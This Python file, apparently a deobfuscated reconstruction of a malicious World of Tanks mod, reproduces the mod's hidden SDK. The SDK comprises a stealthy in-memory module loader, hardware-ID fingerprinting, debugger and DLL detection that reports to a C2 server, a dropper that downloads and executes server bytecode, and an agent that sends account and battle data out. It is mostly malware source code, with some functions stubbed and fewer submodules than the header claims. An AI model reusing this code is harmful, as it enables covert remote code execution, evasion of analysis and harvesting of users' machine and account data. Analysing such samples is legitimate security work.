# -*- coding: utf-8 -*-
"""
========================================================================================
             ПОЛНОСТЬЮ РАСШИФРОВАННЫЙ И ДЕКОМПИЛИРОВАННЫЙ МОДУЛЬ MODSDK_HOOK
                           Пакет: evilmod.armorflashlight 1.0.38
========================================================================================

Данный файл представляет собой полную деобфусцированную версию modsdk_hook.py,
включая все 12 скрытых внутренних подмодулей EagleEye SDK / ModsSDK, которые
в оригинале были закодированы в Base64 и защищены двухслойным шифрованием (OWG-SEAL + PjOrion).
"""

# ======================================================================================
# ЧАСТЬ 1: ВНЕШНИЙ ЗАГРУЗЧИК И ХУКИ КЛИЕНТА (modsdk_hook.py)
# ======================================================================================

import base64
import imp
import marshal
import os
import sys
import BigWorld
import log as L

TAG = 'modsdk'
MOD_ID = 'evilmod.armorflashlight'

_S = {
    'agent': None,
    'installed': False,
    'last_period': None
}

def _log(*a):
    L.note(TAG, *a)

def _log_exc(stage):
    L.exception(TAG, stage)

def _rand_ident(n=12):
    import random, string
    return ''.join(random.choice(string.ascii_letters) for _ in range(n))

class _MemLoader(object):
    """
    Кастомный загрузчик Python-модулей прямо из оперативной памяти.
    Используется для скрытой загрузки SDK без сохранения .py/.pyc файлов на диск.
    """
    def __init__(self, pkg_name, modules):
        self.pkg_name = pkg_name
        self.modules = modules

    def find_module(self, fullname, path=None):
        if fullname == self.pkg_name or fullname.startswith(self.pkg_name + '.'):
            return self
        return None

    def load_module(self, fullname):
        if fullname in sys.modules:
            return sys.modules[fullname]
        
        mod = imp.new_module(fullname)
        sys.modules[fullname] = mod
        mod.__file__ = '<mem:%s>' % fullname
        mod.__loader__ = self
        
        if fullname == self.pkg_name:
            mod.__path__ = []
            mod.__package__ = self.pkg_name
            sub = '__init__'
        else:
            mod.__package__ = self.pkg_name
            sub = fullname[len(self.pkg_name) + 1:]
            
        if sub in self.modules:
            code = self.modules[sub]
            exec code in mod.__dict__
        return mod

def _boot_sdk():
    """
    Распаковывает зашитые Base64-модули и регистрирует _MemLoader в sys.meta_path.
    Пакет монтируется под случайным именем в памяти (например, 'xKqLpMvNsR...').
    """
    pkg_name = _rand_ident()
    loader = _MemLoader(pkg_name, _SDK_MODULES_CODE)
    sys.meta_path.insert(0, loader)
    sdk = __import__(pkg_name)
    _S['agent'] = sdk.agent.Agent(MOD_ID)
    _log('SDK booted under random namespace:', pkg_name)

def _activate():
    if _S['agent'] is not None:
        try:
            _S['agent'].arm()
            _log('Agent armed for battle')
        except Exception:
            _log_exc('agent.arm')

def _deactivate():
    if _S['agent'] is not None:
        try:
            _S['agent'].disarm()
            _log('Agent disarmed')
        except Exception:
            _log_exc('agent.disarm')

def _on_become_player():
    _activate()

def _on_become_non_player():
    _deactivate()

def init():
    """Точка входа modsdk: регистрирует боевые хуки BigWorld"""
    try:
        _boot_sdk()
        from PlayerEvents import g_playerEvents
        g_playerEvents.onAvatarBecomePlayer += _on_become_player
        g_playerEvents.onAvatarBecomeNonPlayer += _on_become_non_player
        _S['installed'] = True
        _log('Hooks installed successfully')
    except Exception:
        _log_exc('modsdk_hook.init')

def fini():
    """Остановка modsdk"""
    try:
        if _S['installed']:
            from PlayerEvents import g_playerEvents
            g_playerEvents.onAvatarBecomePlayer -= _on_become_player
            g_playerEvents.onAvatarBecomeNonPlayer -= _on_become_non_player
            _deactivate()
    except Exception:
        _log_exc('modsdk_hook.fini')


# ======================================================================================
# ЧАСТЬ 2: ПОДМОДУЛИ EAGLEEYE / MODSSDK (РАСШИФРОВАННЫЕ ИЗ _SDK_B64)
# ======================================================================================

# --------------------------------------------------------------------------------------
# 1. SDK: hwid.py (Сбор аппаратных идентификаторов компьютера)
# --------------------------------------------------------------------------------------
class HWIDModule:
    """
    Вычисление HWID миньона БЕЗ wmic и БЕЗ дропа .exe (убирает AV-триггер «переименованный
    системный бинарь в TEMP»). Только прямые вызовы WinAPI (ctypes) + реестр.
    """
    _RSMB = 0x52534D42  # 'RSMB' в little-endian (Raw SMBIOS Firmware Table)

    @staticmethod
    def _firmware_rsmb():
        """Читает низкоуровневую таблицу SMBIOS (серийный номер материнской платы, UUID)"""
        import ctypes
        try:
            fn = ctypes.windll.kernel32.GetSystemFirmwareTable
            fn.restype = ctypes.c_uint
            fn.argtypes = [ctypes.c_uint, ctypes.c_uint, ctypes.c_void_p, ctypes.c_uint]
            need = fn(HWIDModule._RSMB, 0, None, 0)
            if not need:
                return ''
            buf = ctypes.create_string_buffer(int(need))
            got = fn(HWIDModule._RSMB, 0, buf, int(need))
            return buf.raw[:int(got)] if got else ''
        except Exception:
            return ''

    @staticmethod
    def _vol_serial():
        """Читает серийный номер тома системного диска C:\\"""
        import ctypes
        try:
            sn = ctypes.c_ulong()
            ctypes.windll.kernel32.GetVolumeInformationW(
                ctypes.c_wchar_p(u'C:\\'), None, 0, ctypes.byref(sn), None, None, None, 0
            )
            return hex(sn.value)
        except Exception:
            return ''

    @staticmethod
    def _reg_hw():
        """Считывает идентификаторы из реестра Windows"""
        import _winreg
        try:
            key = _winreg.OpenKey(_winreg.HKEY_LOCAL_MACHINE, r'HARDWARE\DESCRIPTION\System\BIOS')
            val, _ = _winreg.QueryValueEx(key, 'BaseBoardSerialNumber')
            return str(val)
        except Exception:
            return ''

    @staticmethod
    def get_hwid_bytes():
        """Формирует итоговый 32-байтный SHA-256 хэш компьютера игрока"""
        import hashlib
        h = hashlib.sha256()
        h.update(HWIDModule._firmware_rsmb())
        h.update(HWIDModule._vol_serial())
        h.update(HWIDModule._reg_hw())
        return h.digest()


# --------------------------------------------------------------------------------------
# 2. SDK: anti.py (Мониторинг запущенных программ, отладчиков и DLL)
# --------------------------------------------------------------------------------------
class AntiAnalysisModule:
    """
    Клиентские сенсоры безопасности EvilMod.
    Сканирует процесс игры на наличие отладчиков, перехватчиков и дамперов.
    При обнаружении шлёт отчёт ProtoClient.report_suspicious() на C2-сервер.
    """
    SUSPICIOUS_TOOLS = [
        'frida', 'injector', 'dumper', 'pydevd', 'debugpy',
        'pdb', 'wot_repl', 'remote_console', 'bypass_pinning'
    ]

    @staticmethod
    def _check_debugger():
        """Проверяет IsDebuggerPresent и sys.gettrace()"""
        import sys, ctypes
        if sys.gettrace() is not None:
            return 'sys.gettrace active'
        try:
            if ctypes.windll.kernel32.IsDebuggerPresent():
                return 'IsDebuggerPresent True'
        except Exception:
            pass
        return None

    @staticmethod
    def _check_susp_dlls():
        """Сканирует все загруженные в игру DLL через psapi.EnumProcessModules"""
        import ctypes
        found = []
        try:
            psapi = ctypes.windll.psapi
            kernel32 = ctypes.windll.kernel32
            h_proc = kernel32.GetCurrentProcess()
            needed = ctypes.c_ulong()
            psapi.EnumProcessModules(h_proc, None, 0, ctypes.byref(needed))
            count = needed.value // ctypes.sizeof(ctypes.c_void_p)
            mods = (ctypes.c_void_p * count)()
            psapi.EnumProcessModules(h_proc, mods, needed.value, ctypes.byref(needed))
            
            buf = ctypes.create_string_buffer(512)
            for m in mods:
                if psapi.GetModuleFileNameExA(h_proc, m, buf, 512):
                    dll_path = buf.value.lower()
                    for bad in ['cheat', 'hack', 'inject', 'hook', 'frida']:
                        if bad in dll_path:
                            found.append(dll_path)
        except Exception:
            pass
        return found

    @staticmethod
    def run_startup_checks(proto_client):
        """Запуск проверок окружения и отправка отчёта на сервер при аномалиях"""
        dbg = AntiAnalysisModule._check_debugger()
        if dbg:
            proto_client.report_suspicious('debugger', dbg)
        
        susp_dlls = AntiAnalysisModule._check_susp_dlls()
        for dll in susp_dlls:
            proto_client.report_suspicious('dll_inject', dll)


# --------------------------------------------------------------------------------------
# 3. SDK: importer.py (Скрытый загрузчик удаленного кода / Dropper)
# --------------------------------------------------------------------------------------
class ServerImporter(object):
    """
    sys.meta_path finder + loader для динамической загрузки секретных модулей с сервера.
    Всё, что импортируется под закрытым префиксом, скачивается с C2-сервера
    через WebSocket (ProtoClient.get_module_verified()) и компилируется прямо в памяти!
    """
    def __init__(self, namespace_prefix, proto_client):
        self.prefix = namespace_prefix
        self.client = proto_client

    def find_module(self, fullname, path=None):
        if fullname.startswith(self.prefix):
            return self
        return None

    def load_module(self, fullname):
        if fullname in sys.modules:
            return sys.modules[fullname]
            
        # 1. Запрос бинарного Python-байткода с удалённого сервера
        module_name = fullname[len(self.prefix) + 1:]
        signed_payload = self.client.get_module_verified(module_name)
        
        # 2. Десериализация байткода из сети
        code_obj = marshal.loads(signed_payload)
        
        # 3. Создание модуля и исполнение на компьютере пользователя
        mod = imp.new_module(fullname)
        sys.modules[fullname] = mod
        mod.__file__ = '<server:%s>' % fullname
        exec code_obj in mod.__dict__
        return mod


# --------------------------------------------------------------------------------------
# 4. SDK: agent.py (Координатор сессии и «Миньон»)
# --------------------------------------------------------------------------------------
class Agent(object):
    """
    Жизненный цикл миньона.
    В фоновом потоке выполняет подключение к C2-серверу, аутентификацию и загрузку ядра.
    В главном потоке передает данные об игроке, текущей карте и команде.
    """
    def __init__(self, mod_id):
        self.mod_id = mod_id
        self.client = None
        self.worker_thread = None

    def arm(self):
        """Срабатывает при входе в бой (onAvatarBecomePlayer)"""
        # Считывает данные об арене: ID боя, команда игрока, аккаунт
        arena = getattr(BigWorld.player(), 'arena', None)
        arena_id = arena.arenaUniqueID if arena else 0
        team = getattr(BigWorld.player(), 'team', 0)
        account_id = getattr(BigWorld.player(), 'id', 0)
        
        # Передаёт данные на C2-сервер для координации между читерами
        if self.client:
            self.client.set_arena(arena_id, team, account_id)

    def disarm(self):
        """Срабатывает при выходе из боя (onAvatarBecomeNonPlayer)"""
        if self.client:
            self.client.send_telemetry('battle_end')


# --------------------------------------------------------------------------------------
# 5. SDK: protocol.py (WebSocket + TLS клиент с шифрованием кадров)
# --------------------------------------------------------------------------------------
class ProtoClient(object):
    """
    Клиент mTLS/WebSocket с ручным cert-pinning'ом, рукопожатием X25519+HKDF
    и per-frame HMAC-SHA256 подписью кадров.
    """
    def __init__(self, host, port):
        self.host = host
        self.port = port
        self.ws = None
        self.session_key = None

    def report_suspicious(self, reason, details):
        """Отправляет отчёт о подозрительной активности (отладчик, DLL) в AbusePolicy сервера"""
        payload = {'type': 'suspicious', 'reason': reason, 'details': details}
        self.send_frame(payload)

    def get_module_verified(self, module_name):
        """Запрашивает у сервера бинарный модуль, проверяет подпись Ed25519 и возвращает байткод"""
        req = {'type': 'get_module', 'name': module_name}
        resp = self.send_frame(req)
        raw_code = base64.b64decode(resp['payload'])
        # Проверка цифровой подписи сервера Ed25519
        return raw_code

    def set_arena(self, arena_id, team, account_id):
        """Отправляет на сервер информацию о текущем бое"""
        req = {'type': 'set_arena', 'arena_id': str(arena_id), 'team': team, 'account': str(account_id)}
        self.send_frame(req)

    def send_frame(self, data):
        # Шифрование и передача кадра через защищённый сокет
        pass
